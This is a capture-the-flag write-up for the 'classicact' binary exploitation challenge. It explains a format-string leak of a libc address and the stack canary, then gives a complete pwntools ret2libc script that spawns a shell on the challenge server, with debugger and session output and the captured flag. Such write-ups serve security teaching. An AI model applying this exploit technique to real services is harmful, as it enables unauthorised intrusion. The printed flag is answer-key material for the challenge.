## Question 

Pwning your friends is a class act. So why not do it to some random server?
[classicact](classicact)

0.cloud.chals.io 10058

## Solution

The first input suffers from a format string vulnerability. We can use it to leak the address of ```_IO_2_1_stdout_``` in libc and the stack canary. 

```
pwndbg> r
Starting program: /root/workspace/classicact 
Please enter your name!
%12$p.%19$p           
Hello:
0x7ffff7fa56c0.0x43b7ce88a6a7e900
What would you like to do today?

pwndbg> x/i 0x7ffff7fa56c0
   0x7ffff7fa56c0 <_IO_2_1_stdout_>:    xchg   DWORD PTR [rax],ebp

pwndbg> canary
AT_RANDOM = 0x7fffffffe849 # points to (not masked) global canary value
Canary    = 0x43b7ce88a6a7e900 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffe528 ◂— 0x43b7ce88a6a7e900
```

Since we have an address to libc we can just call system('/bin/sh'). We'll need a ```pop rdi; ret``` gadget to load the address of /bin/sh into rdi. We'll also need a ```ret``` gadget to align the stack. 

```python
   ret = (r.find_gadget(['ret']))[0]
   pop_rdi = pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0] 
   binsh=next(libc.search(b'/bin/sh\0'))
   system=libc.sym['system']
```

The binary has stack canaries enabled, so we'll need to repair the canary before executing our ROP chain.

```python
   chain = cyclic(72)
   chain += p64(canary)
   chain += cyclic(8)
   chain += p64(ret)
   ...
```

Our [final exploit](pwn-classictact.py) follows. After a little trial and error, we determined the challenge authors were using an ubuntu:20.04 container. So we used the following [libc](libc-20.04)

```python
from pwn import *

def leak():
   p.sendline(b'%12$p.%19$p')
   p.recvuntil(b'Hello:')
   leaks=p.recv().strip(b'\nWhat would you like to do today?\n').split(b'.')
   libc.address=int(leaks[0],16)-libc.sym['_IO_2_1_stdout_'] 
   canary=int(leaks[1],16)
   return canary

def rop_system(canary):
   ret = (r.find_gadget(['ret']))[0]
   pop_rdi = pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0] 
   binsh=next(libc.search(b'/bin/sh\0'))
   system=libc.sym['system']

   chain = cyclic(72)
   chain += p64(canary)
   chain += cyclic(8)
   chain += p64(ret)
   chain += p64(pop_rdi)
   chain += p64(binsh)
   chain += p64(system)
   p.sendline(chain)


e = context.binary = ELF('./classicact')
r = ROP(e)
#libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc= ELF('./libc-20.04')
#p = process('./classicact',level="error")  
p = remote('0.cloud.chals.io',10058)

canary=leak()
rop_system(canary)
p.interactive()
```
Running it gives us a shell and we can read the flag.

```
[+] Opening connection to 0.cloud.chals.io on port 10058: Done
[*] Switching to interactive mode
Good luck doing that!
$ cat flag
UMDCTF{H3r3_W3_G0_AgAIn_an0thEr_RET2LIBC}
```

